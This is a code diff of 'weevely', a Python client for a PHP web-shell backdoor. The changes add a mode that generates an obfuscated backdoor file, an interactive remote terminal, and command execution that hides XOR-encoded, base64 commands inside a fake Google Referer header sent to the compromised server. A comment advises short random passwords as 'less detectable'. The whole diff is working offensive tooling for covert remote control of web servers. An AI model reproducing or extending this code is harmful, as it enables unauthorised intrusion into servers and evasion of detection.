@@ -1,8 +1,12 @@
 # -*- coding: utf-8 -*-
 
 from numpy import frombuffer, bitwise_xor, byte
-import getopt, sys, base64, os, urllib2, re
+import getopt, sys, base64, os, urllib2, re, urlparse
     
+    
+    
+#e = re.compile("=(.*)")
+#print e.findall("?asd=cu&asd2=cu2&asd3=cu3")[0]    
 
 
 back="""
@@ -27,31 +31,64 @@ class weevely:
     #self.generate()
   
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'g:u:p:e:c', ['generate', 'url', 'password', 'exec', 'console'])
+	opts, args = getopt.getopt(sys.argv[1:], 'tgc:u:p:o:', ['generate', 'url', 'password', 'terminal', 'command', 'output'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
-
-    cmnd=False;
-    console=False;
+    
     for o, a in opts:
 	if o in ("-g", "-generate"):
-	  print "+ generating backdoor code in", a
+	  mode='g'
+	if o in ("-t", "-terminal"):
+	  mode='t'
+	if o in ("-c", "-command"):
+	  cmnd=a
+	  mode='c'
+	  
 	if o in ("-u", "-url"):
 	  url=a
+	  parsed=urlparse.urlparse(url)
+	  if not parsed.scheme:
+	    url="http://"+url
+	  if not parsed.netloc:
+	    print "- Error: URL not valid"
+	    sys.exit(1)
+	  
 	if o in ("-p", "-password"):
 	  pwd=a
-	if o in ("-e", "-exec"):
-	  cmnd=a
-	  mode=0
-	if o in ("-c", "-console"):
-	  console=True
-	  mode=0
-	   
-    if cmnd: 
-      self.execute(url,pwd,cmnd,mode)
-    if console:
-      self.console(url,pwd,mode)
+	if o in ("-o", "-output"):
+	  outfile=a
+
+    if 'mode' in locals():
+
+      if mode=='c' or mode=='t':
+	if 'url' not in locals():
+	  print "! Please specify URL (-u)"
+	  sys.exit(1)
+	  
+      if mode=='g':
+	if 'outfile' not in locals():
+	  print "! Please specify where generate backdoor file (-o)"
+	  sys.exit(1)
+
+      if 'pwd' not in locals():
+	print "+ A short random password with alphanumeric characters (like 'a33k44') is less detectable.\n+ Please insert the password: ",
+	pwd = sys.stdin.readline()
+
+	
+
+      if mode=='c': 
+	self.execute(url,pwd,cmnd,mode)
+      if mode=='t':
+	self.terminal(url,pwd,mode)
+      if mode=='g':
+	self.generate(pwd,outfile)
+    else:
+      print "- Please specify if generate (-g) backdoor file, or executing a remote command (-c) or a remote terminal (-t)"
+      sys.exit(1)
+
+      
+
      
   def crypt(self, text, key):
     #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
@@ -60,16 +97,22 @@ class weevely:
     strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
     strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
     
-    toret = base64.b64encode(( (text ^ firstpad) & strrepeat ) | ( text & strrepeat2 ))
+    bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
+    
+    toret = base64.b64encode(bit.tostring())
     return toret 
 
   def execute(self, url, pwd, cmnd, mode):
     cmdstr=self.crypt(cmnd,pwd)
-    refurl='http://www.google.com/asdsds?dsa=c4m4ll0&asd=' + cmdstr + '&asdsad=' + str(mode)
-    ret=self.execHTTPGet(refurl,url)
-    restring='<' + pwd + '>(.*)</' + pwd + '>'
-    e = re.compile(restring,re.DOTALL)
-    print e.findall(ret)[0]
+    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
+    try: 
+      ret=self.execHTTPGet(refurl,url)
+    except urllib2.URLError, e:
+      print '- Error: ' + str(e.reason)
+    else: 
+      restring='<' + pwd + '>(.*)</' + pwd + '>'
+      e = re.compile(restring,re.DOTALL)
+      print e.findall(ret)[0]
     
   def execHTTPGet(self, refurl, url):
     req = urllib2.Request(url)
@@ -77,11 +120,15 @@ class weevely:
     r = urllib2.urlopen(req)
     return r.read()
     
-  def console(self, url, pwd, mode):
+  def terminal(self, url, pwd, mode):
     while True:
       print "exec> ",
       cmnd = sys.stdin.readline()
-      self.execute(url, pwd, cmnd, mode)
+      if cmnd!='\n':
+	self.execute(url, pwd, cmnd, mode)
+	
+  def generate(self,key,path):
+    print self.crypt(back,key)
     
 if __name__ == "__main__":
     
